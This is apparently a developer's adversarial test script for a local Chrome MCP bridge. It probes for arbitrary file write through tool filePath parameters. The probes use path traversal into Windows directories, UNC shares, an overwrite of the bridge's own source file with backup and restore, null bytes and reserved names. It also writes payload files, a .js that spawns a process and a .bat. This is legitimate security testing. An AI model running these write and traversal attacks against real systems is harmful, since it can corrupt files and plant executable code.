// adv-08: arbitrary file write surface via filePath params.
// Bridge writeOut() (index.js:151) does path.resolve(file.path) + mkdir -p + writeFileSync
// with NO validation. Extension echoes our filePath into file.path verbatim.
import fs from 'node:fs';
import crypto from 'node:crypto';

const BASE = 'http://127.0.0.1:7890/mcp';
let sid, i = 0;
const rpc = async b => {
  const r = await fetch(BASE, { method: 'POST', headers: { 'content-type': 'application/json', 'accept': 'application/json, text/event-stream', ...(sid ? { 'mcp-session-id': sid } : {}) }, body: JSON.stringify(b) });
  const t = await r.text();
  if (!sid) sid = r.headers.get('mcp-session-id');
  const m = t.split('\n').filter(l => l.startsWith('data:')).map(l => JSON.parse(l.slice(5).trim()));
  return { msg: m[m.length - 1], status: r.status };
};
await rpc({ jsonrpc: '2.0', id: ++i, method: 'initialize', params: { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 't', version: '0' } } });
await rpc({ jsonrpc: '2.0', method: 'notifications/initialized' });
const call = (n, a) => rpc({ jsonrpc: '2.0', id: ++i, method: 'tools/call', params: { name: n, arguments: a } });

const BRIDGE = 'D:/Tool/chrome-mcp/bridge';
const ADV = BRIDGE + '/adv-tests';
const exists = p => { try { return fs.existsSync(p); } catch { return 'ERR'; } };
const text = r => r.msg?.result?.content?.[0]?.text ?? JSON.stringify(r.msg);
const sha = p => crypto.createHash('sha256').update(fs.readFileSync(p)).digest('hex');

// --- setup: page ---
const np = await call('new_page', { url: 'https://example.com' });
const npTxt = text(np);
const pageId = JSON.parse(npTxt.slice(npTxt.indexOf('{'))).pageId;
console.log('pageId=', pageId);

const results = [];
const probe = async (label, tool, args, checkPaths) => {
  const r = await call(tool, args);
  const t = text(r).split('\n').slice(0, 3).join(' | ');
  const checks = checkPaths.map(p => `${p} => ${exists(p)}`).join(' ; ');
  console.log(`\n[${label}]\n  resp: ${t.slice(0, 220)}\n  disk: ${checks}`);
  results.push({ label, resp: t.slice(0, 160), checks });
};

// 1. baseline
await probe('baseline abs in adv-tests', 'take_screenshot', { pageId, filePath: `${ADV}/probe.txt` }, [`${ADV}/probe.txt`]);

// 2. relative traversal — bridge cwd is D:\Tool\chrome-mcp\bridge => lands D:\Windows\Temp
await probe('relative traversal ../../../../Windows/Temp', 'take_screenshot', { pageId, filePath: '../../../../Windows/Temp/mcp-pwn.txt' }, ['D:/Windows/Temp/mcp-pwn.txt']);

// 2b. bare relative -> reveals bridge cwd
await probe('bare relative cwd marker', 'take_screenshot', { pageId, filePath: 'adv08-cwd-marker.txt' }, [`${BRIDGE}/adv08-cwd-marker.txt`, `${ADV}/adv08-cwd-marker.txt`]);

// 3. absolute C:\Windows\Temp
await probe('absolute C:/Windows/Temp', 'take_screenshot', { pageId, filePath: 'C:/Windows/Temp/mcp-pwn2.txt' }, ['C:/Windows/Temp/mcp-pwn2.txt']);

// 4. System32 — expect fail
await probe('C:/Windows/System32', 'take_screenshot', { pageId, filePath: 'C:/Windows/System32/mcp-pwn.txt' }, ['C:/Windows/System32/mcp-pwn.txt']);

// 5. UNC admin share
await probe('UNC \\\\127.0.0.1\\c$\\Temp', 'take_screenshot', { pageId, filePath: '\\\\127.0.0.1\\c$\\Temp\\unc-pwn.txt' }, ['\\\\127.0.0.1\\c$\\Temp\\unc-pwn.txt']);

// 6. OVERWRITE bridge source — backup first, restore after, compare hashes
const idxPath = `${BRIDGE}/index.js`, bak = `${ADV}/index.js.bak`;
const h0 = sha(idxPath); fs.copyFileSync(idxPath, bak);
await probe('OVERWRITE index.js via evaluate_script', 'evaluate_script', { pageId, function: '() => "PWNED-BY-MCP"', filePath: idxPath }, [idxPath]);
const h1 = sha(idxPath);
const intact = h0 === h1;
console.log(`  index.js hash before=${h0.slice(0, 12)} after=${h1.slice(0, 12)} intact=${intact}`);
if (!intact) { fs.copyFileSync(bak, idxPath); console.log('  !!! CRITICAL: index.js OVERWRITTEN — restored from backup'); }

// 7. arbitrary extension + content control (.js and .bat)
await probe('write .js w/ controlled content', 'evaluate_script', { pageId, function: '() => "require(`child_process`).exec(`calc`)"', filePath: `${ADV}/evil.js` }, [`${ADV}/evil.js`]);
await probe('write .bat payload', 'evaluate_script', { pageId, function: '() => "@echo pwned > C:\\Windows\\Temp\\bat-ran.txt"', filePath: `${ADV}/pwn.bat` }, [`${ADV}/pwn.bat`]);
if (exists(`${ADV}/evil.js`)) console.log('  evil.js content:', fs.readFileSync(`${ADV}/evil.js`, 'utf8').slice(0, 90));
if (exists(`${ADV}/pwn.bat`)) console.log('  pwn.bat content:', fs.readFileSync(`${ADV}/pwn.bat`, 'utf8').slice(0, 90));

// 8. null byte
await probe('null byte x.txt\\x00.png', 'take_screenshot', { pageId, filePath: `${ADV}/x.txt${String.fromCharCode(0)}.png` }, [`${ADV}/x.txt.png`, `${ADV}/x.txt`]);

// 9. Windows reserved device names
await probe('reserved CON.txt', 'take_screenshot', { pageId, filePath: `${ADV}/CON.txt` }, [`${ADV}/CON.txt`]);
await probe('reserved NUL', 'take_screenshot', { pageId, filePath: `${ADV}/NUL` }, [`${ADV}/NUL`]);
await probe('reserved aux.js', 'take_screenshot', { pageId, filePath: `${ADV}/aux.js` }, [`${ADV}/aux.js`]);

// 10. long paths
await probe('300-char single segment', 'take_screenshot', { pageId, filePath: `${ADV}/` + 'a'.repeat(280) + '.txt' }, []);
await probe('deep nested >260 total', 'take_screenshot', { pageId, filePath: `${ADV}/` + 'deep/'.repeat(60) + 'f.txt' }, [`${ADV}/deep`]);
await probe('500-char filename', 'take_screenshot', { pageId, filePath: 'a'.repeat(500) }, []);

// 11. type confusion
await probe('empty filePath', 'take_screenshot', { pageId, filePath: '' }, []);
await probe('numeric filePath', 'take_screenshot', { pageId, filePath: 123 }, []);
await probe('object filePath', 'take_screenshot', { pageId, filePath: { x: 1 } }, []);

// 12. save_pdf to existing directory
await probe('save_pdf to dir path', 'save_pdf', { pageId, filePath: ADV }, []);

// 13. save_pdf traversal to C:/Windows/Temp
await probe('save_pdf C:/Windows/Temp', 'save_pdf', { pageId, filePath: 'C:/Windows/Temp/mcp-pwn.pdf' }, ['C:/Windows/Temp/mcp-pwn.pdf']);

// 14. http_request filePath (writes response body, base64)
await probe('http_request filePath', 'http_request', { url: 'https://example.com/', filePath: `${ADV}/http-out.bin` }, [`${ADV}/http-out.bin`]);
await probe('http_request -> C:/Windows/Temp', 'http_request', { url: 'https://example.com/', filePath: 'C:/Windows/Temp/mcp-http-pwn.txt' }, ['C:/Windows/Temp/mcp-http-pwn.txt']);

// 15. get_network_request requestFilePath/responseFilePath (two writes per call)
await call('list_network_requests', { pageId });           // attach debugger
await call('evaluate_script', { pageId, function: '() => fetch("/").then(r=>r.status)' });
await new Promise(r => setTimeout(r, 1500));
const lnr = await call('list_network_requests', { pageId });
const lnrTxt = text(lnr);
let reqid; try { const arr = JSON.parse(lnrTxt.slice(lnrTxt.indexOf('{'))).requests; reqid = arr?.[arr.length - 1]?.reqid; } catch {}
console.log('\nreqid=', reqid);
if (reqid != null) {
  await probe('get_network_request resp+req files', 'get_network_request', { pageId, reqid, responseFilePath: `${ADV}/net-resp.txt`, requestFilePath: 'C:/Windows/Temp/mcp-netreq-pwn.txt' }, [`${ADV}/net-resp.txt`, 'C:/Windows/Temp/mcp-netreq-pwn.txt']);
}

// 16. download_file filename traversal (chrome.downloads, relative to Downloads)
await probe('download_file ../ traversal', 'download_file', { url: 'https://example.com/', filename: '../adv-dl-escape.html' }, []);
const dl = await call('list_downloads', { limit: 3 });
console.log('downloads:', text(dl).slice(0, 400));

// hygiene: close tab
await call('close_page', { pageId });
console.log('\nDONE');
